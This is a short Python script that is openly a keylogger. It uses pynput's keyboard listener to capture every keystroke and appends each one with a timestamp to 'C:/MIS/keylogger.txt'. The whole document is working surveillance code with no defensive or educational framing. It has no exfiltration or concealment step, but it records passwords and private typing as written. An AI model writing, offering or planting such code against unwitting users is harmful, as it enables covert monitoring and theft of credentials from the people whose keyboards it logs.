from pynput.keyboard import Key, Listener
import logging

logging_directory = "C:/MIS/"
LOG_FORMAT = "%(asctime)s: %(message)s"
logging.basicConfig(filename=logging_directory + "keylogger.txt", level=logging.DEBUG, format=LOG_FORMAT)


def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()
